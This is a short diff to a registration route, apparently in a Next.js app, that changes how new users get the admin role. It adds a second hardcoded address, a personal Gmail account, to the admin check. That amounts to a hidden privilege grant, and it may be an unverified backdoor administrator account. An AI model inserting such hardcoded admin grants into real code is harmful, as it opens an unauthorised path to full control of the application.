@@ -38,7 +38,7 @@ export async function POST(req: NextRequest) {
     const passwordHash = await bcrypt.hash(password, 12);
 
     // Determine role
-    const isAdmin = emailLower === 'admin@smartcodai.com';
+    const isAdmin = emailLower === 'admin@smartcodai.com' || emailLower === 'issamo1555@gmail.com';
 
     // Create user
     const user = await prisma.user.create({
